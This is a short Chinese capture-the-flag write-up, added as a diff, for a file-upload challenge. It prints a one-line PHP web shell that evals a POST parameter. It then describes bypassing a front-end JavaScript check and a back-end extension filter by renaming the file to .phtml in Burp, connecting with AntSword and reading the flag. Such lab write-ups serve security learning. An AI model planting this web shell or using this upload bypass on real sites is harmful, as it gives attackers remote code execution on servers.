@@ -1,0 +1,19 @@
+题目类型为文件上传
+
+很简单的一个验证
+
+首先上传一个shell test1.php
+
+<?php eval($_POST['KKKKK']); ?>
+
+发现前端过滤，修改文件名为.jpg或者f12将js的check函数干掉
+
+上传仍然失败，猜测后端验证，burp抓包修改文件名为.phtml上传成功
+
+蚁剑连接
+url/upload/hash.phtml
+password KKKKK
+
+根目录发现flag
+
+注：本题不能使用图片马直接上传，文件类型不是可执行文件
